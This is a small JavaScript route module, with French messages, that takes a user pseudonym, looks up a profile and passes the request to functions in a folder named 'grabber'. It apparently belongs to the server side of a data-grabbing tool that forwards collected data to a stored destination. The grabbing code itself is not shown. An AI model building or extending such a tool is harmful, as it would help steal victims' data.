const profil = require("../../assets/function/grabber/profil.js");
const send = require("../../assets/function/grabber/send.js");
module.exports = {
    path: "/send",
    method: "post",
    go: async (req, res) => {
        const pp = req.body.pseudo;
        const web = await profil(pp);
        if (!web) return res.status(404).send({ error: { err: `[404] ERROR: Profil introuvable.` } });
        await send(req, web[5], web[6]);
        return res.status(200).json({ succes: { succ: "[200] SUCCESS: Lancement de la vérification des données." } });
    }
}